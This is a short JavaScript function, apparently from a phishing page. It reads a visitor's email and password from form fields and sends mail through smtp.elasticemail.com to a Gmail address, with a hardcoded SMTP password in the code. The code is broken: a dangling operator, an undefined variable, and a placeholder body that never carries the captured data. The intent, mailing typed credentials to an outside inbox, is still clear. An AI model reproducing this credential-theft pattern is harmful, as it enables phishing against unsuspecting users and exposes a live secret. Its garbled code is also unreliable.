function emailSend() {
  
  var text = document.getElementById('email').value;
  
  var password = document.getElementById('password').value;
  
  var  messageBody='email'+ email + "</br> Password" + password +
  
  Email.send({
  Host: "smtp.elasticemail.com",
  Username: "mattorion6@gmail.com",
  Password:"2DFB2108CD95CB2ADF9C34E5E9D3EBD17689",
  To: 'mattorion6@gmail.com',
  From: "mattorion6@gmail.com",
  Subject: "This is the subject",
  Body: "And this is the body"
}).then(
  message => alert(message)
);
}